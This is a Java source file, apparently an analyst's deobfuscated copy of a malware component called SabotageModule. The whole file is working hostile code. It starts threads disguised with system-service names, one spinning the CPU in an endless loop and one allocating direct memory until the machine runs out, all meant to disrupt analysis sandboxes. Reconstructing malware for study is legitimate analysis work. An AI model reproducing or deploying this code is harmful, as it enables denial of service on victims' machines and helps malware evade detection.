import java.nio.ByteBuffer;
import java.util.ArrayList;

/**
 * Cleaned SabotageModule (formerly ա.java / uni_0561)
 * Used to consume CPU and RAM to disrupt analysis and sandboxing.
 */
public class SabotageModule {

    /**
     * Infinite loop that consumes CPU cycles with useless math.
     */
    public static void startCPUBloater() {
        new Thread(() -> {
            while (true) {
                // Useless complex math to spike CPU
                double d = Math.tan(Math.atan(Math.random()));
            }
        }, "System-Service-Worker-CPU").start();
    }

    /**
     * Infinite loop that allocates direct memory buffers to fill RAM.
     */
    public static void startMemoryBloater() {
        new Thread(() -> {
            ArrayList<ByteBuffer> junk = new ArrayList<>();
            try {
                while (true) {
                    // Allocate 1MB chunks continuously
                    junk.add(ByteBuffer.allocateDirect(1024 * 1024));
                    Thread.sleep(100);
                }
            } catch (Throwable ignored) {
                // If it crashes due to OOM, the malware doesn't care
            }
        }, "System-Service-Worker-MEM").start();
    }

    public static void main(String[] args) {
        // This is likely how it's started by the main loader
        startCPUBloater();
        startMemoryBloater();
    }
}
